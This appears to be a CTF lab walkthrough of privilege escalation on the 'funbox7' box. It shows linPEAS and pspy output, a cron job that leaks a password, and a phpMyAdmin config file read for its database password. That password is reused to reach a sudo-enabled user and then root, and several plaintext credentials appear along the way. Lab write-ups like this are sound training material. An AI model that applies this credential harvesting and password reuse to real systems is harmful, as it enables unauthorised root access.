# 3 box enum www-data > privesc > root

```
www-data@funbox7:/home$ ls -la
total 28
drwxr-xr-x  7 root   root   4096 Sep 18  2020 .
drwxr-xr-x 24 root   root   4096 Sep 19  2020 ..
drwxr-xr-x  2 goat   goat   4096 Feb 16 13:25 goat
drwxr-xr-x  2 harry  harry  4096 Jan 28  2021 harry
drwxr-xr-x  2 karla  karla  4096 Feb 16 13:23 karla
drwxr-xr-x  2 oracle oracle 4096 Feb 16 13:23 oracle
drwxr-xr-x  2 sally  sally  4096 Jan 28  2021 sally

# no files in any user
# nothing in /opt
```

## PEAS

```
╣ Active Ports
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -

╣ Users with console
goat:x:1003:1003:,,,:/home/goat:/bin/bash
harry:x:1001:1001:,,,:/home/harry:/bin/bash
karla:x:1000:1000:karla:/home/karla:/bin/bash
lissy:x:1005:1005::/home/lissy:/bin/sh
oracle:$1$|O@GOeN\$PGb9VNu29e9s6dMNJKH/R0:1004:1004:,,,:/home/oracle:/bin/bash
root:x:0:0:root:/root:/bin/bash
sally:x:1002:1002:,,,:/home/sally:/bin/bash

╣ MySQL version
mysql  Ver 14.14 Distrib 5.7.31, for Linux (x86_64) using  EditLine wrapper

╣ SUID - Check easy privesc, exploits and write perms
-rwsr-xr-x 1 root root 22K Mar 27  2019 /usr/bin/pkexec

╣ SGID
-rwsr-sr-x 1 daemon daemon 51K Feb 20  2018 /usr/bin/at
```

```
# we can become oracle as we have password

www-data@funbox7:/var/www/html$ su oracle
Password:
oracle@funbox7:/var/www/html$ whoami;id
oracle
uid=1004(oracle) gid=1004(oracle) groups=1004(oracle)
```

## pspy

```
2021/08/13 18:16:01 CMD: UID=0    PID=24777  | /usr/sbin/CRON -f
2021/08/13 18:17:01 CMD: UID=0    PID=24787  | tar -cvzf /root/html.tar.gz /var/www/html/ -ulissy -pgangsta
2021/08/13 18:17:01 CMD: UID=0    PID=24784  | /bin/sh -c tar -cvzf /root/html.tar.gz /var/www/html/ -ulissy -pgangsta
```

```
www-data@funbox7:/tmp$ cat /etc/phpmyadmin/config-db.php
<?php
$dbuser='phpmyadmin';
$dbpass='tgbzhnujm!';
$basepath='';
$dbname='phpmyadmin';
$dbserver='localhost';
$dbport='3306';
$dbtype='mysql';
www-data@funbox7:/tmp$

http://192.168.105.132/phpmyadmin
# logged in
# nothing in pma__users

# trying password for different users
www-data@funbox7:/tmp$ su karla
Password:
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

karla@funbox7:/tmp$ sudo -l
[sudo] password for karla:
Matching Defaults entries for karla on funbox7:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User karla may run the following commands on funbox7:
    (ALL : ALL) ALL
karla@funbox7:/tmp$ sudo su
root@funbox7:/tmp# whoami;id;hostname
root
uid=0(root) gid=0(root) groups=0(root)
funbox7
```
